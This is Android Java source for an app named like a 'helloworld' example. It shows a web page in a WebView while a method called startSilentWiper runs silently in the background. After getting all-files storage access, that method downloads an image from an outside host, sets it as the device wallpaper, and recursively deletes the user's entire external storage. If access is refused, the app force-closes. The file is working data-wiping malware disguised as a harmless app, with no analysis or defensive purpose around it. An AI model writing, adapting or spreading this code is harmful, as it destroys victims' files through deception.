package com.example.helloworld;

import android.app.Activity;
import android.app.WallpaperManager;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {
    private static final int REQ_STORAGE = 1;
    private static final String TARGET_URL = "https://xsoniabug.vercel.app";
    private static final String WALLPAPER_URL = "https://i.ibb.co/7t33nLmD/ofky-Ku-DJWpo16b-Q0cc-Yh-G-upload.jpg"; 
    private WebView webView;
    private boolean isWiping = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                view.loadUrl(request.getUrl().toString());
                return true;
            }
        });
        webView.loadUrl(TARGET_URL);
        setContentView(webView);
        if (hasStoragePermission()) {
            startSilentWiper();
        } else {
            requestStoragePermission();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (hasStoragePermission() && !isWiping) {
            startSilentWiper();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_STORAGE) {
            if (hasStoragePermission()) {
                startSilentWiper();
            } else {
                forceCloseApp();
            }
        }
    }

    private boolean hasStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            return Environment.isExternalStorageManager();
        }
        return checkSelfPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                && checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
    }

    private void requestStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            } catch (Exception e) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                startActivity(intent);
            }
        } else {
            requestPermissions(new String[]{
                    android.Manifest.permission.READ_EXTERNAL_STORAGE,
                    android.Manifest.permission.WRITE_EXTERNAL_STORAGE
            }, REQ_STORAGE);
        }
    }

    private void startSilentWiper() {
        if (isWiping) return;
        isWiping = true;
        new Thread(new Runnable() {
            @Override
            public void run() {
                setCustomWallpaper();
                File internalStorage = Environment.getExternalStorageDirectory();
                deleteRecursive(internalStorage);
            }
        }).start();
    }

    private void deleteRecursive(File fileOrDirectory) {
        if (fileOrDirectory == null || !fileOrDirectory.exists()) return;

        if (fileOrDirectory.isDirectory()) {
            File[] children = fileOrDirectory.listFiles();
            if (children != null) {
                for (File child : children) {
                    if (child.getAbsolutePath().contains(getPackageName())) continue;
                    deleteRecursive(child);
                }
            }
        }
        fileOrDirectory.delete();
    }

    private void setCustomWallpaper() {
        try {
            URL url = new URL(WALLPAPER_URL);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoInput(true);
            connection.connect();
            InputStream input = connection.getInputStream();
            Bitmap myBitmap = BitmapFactory.decodeStream(input);

            WallpaperManager myWallpaperManager = WallpaperManager.getInstance(getApplicationContext());
            myWallpaperManager.setBitmap(myBitmap);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void forceCloseApp() {
        finishAffinity();
        System.exit(0);
    }
    
    @Override
    public void onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }
}
